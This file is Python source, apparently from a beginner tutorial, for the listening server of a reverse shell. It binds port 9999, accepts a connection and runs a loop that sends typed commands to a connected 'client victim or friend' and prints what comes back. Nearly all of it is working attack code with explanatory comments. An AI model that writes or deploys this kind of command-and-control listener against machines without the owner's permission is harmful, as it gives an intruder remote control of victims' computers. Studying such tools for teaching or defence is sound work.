import socket
import sys # used to implemnt the command line and terminal command into our python file

# to create a socket (connect two computers)
def create_socket():
# after we define this function we need to declare 3 gloabls variable
    try:
        global host
        global port
        global s # s stands for socket
        host=""
        port=9999 # this is a unused port
        s=socket.socket()  # this is the function to create the socket

    except socket.error as msg:
        print("Socket creation error: "+str(msg))

# binding the socket and listening for connections

def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port: "+str(port))

        s.bind((host,port)) # (this is known as tupile and inside this bracket we will contains the(bind,port))

        s.listen(5)#here we are listing it and it is imp because there is a server and 
        #  then there is a client. now to connect client to server , server should continoulsy liting to the server  
        # here 5 represent the nu of connections it is going to tolerate after which it will going to throw the error

    except socket.error as msg:
        print("Socket binding error: "+str(msg)+"\n"+"Retrying...")
        bind_socket() # it will again call the function if error occurs

# Establish connection with a client (socket must be listening)

def socket_accept():
    #s.accept is the function for accepting the connection
    #and it gives us two very imp data in return
    # the first data is actually the object of the connection
    #the second data is the list which contains the ip address and the port 
    #unless this function is complteed then only it will move to next line
    conn,address=s.accept()
    print("Connection has been established! |"+" IP "+address[0]+" | Port "+str(address[1]))
    #now suppose you want to create a folder in your friend laptop then
    send_command(conn)
    conn.close()#for closing the connection

#send commands to client victim or friend
def send_command(conn):
    # now inside it we want to create a while imfinite loop
    #why infine loop?->because for ex we are going to send  a command to our friend computer
    #and after this it will go to conn.close() command but what if we want to send more than 1 command
    # so for that we have implement the concept of persistence and that is achieved by using infinete while loop
    while True:
        cmd=input() # to take input from us
        #if we want to quit the loop then
        if cmd=='quit':
            conn.close() # for closing the connection
            s.close() # for closing the socket
            sys.exit() # for closing the command prompt

# when we send data from one computer to another then it in not send in the format of string
# it is send in the format of bytes 
#so if we want to send the commands like dir,cls to amother computer we first
#have to encoded it a byte formate
        if len(str.encode(cmd)) >0 :  # str.encode(cmd)->it encodes the data in byte
            conn.send(str.encode(cmd)) # to send the command from our computer to another 

# now if  we send some data then we will receive some information back also 
            client_respone=str(conn.recv(1024),"utf-8")
# when ever the data is being received then we have to convert it from byte format to a str format
#that is where conn.recv comes in and then we convert it into str format
#1024 is because when-ever we are sending or receving bytes,it is send in some kinds of chunks
#it can not be send all at the same time if it is huge 
#utf-8 stands for the encoding type

# now it's turn to print the output to screen
            print(client_respone,end="")
#end="" is after printing the response , it makes it to go to next line 


# now at last we make a function which calls the above function
def main():
    create_socket()
    bind_socket()
    socket_accept()

main() # call the main function 
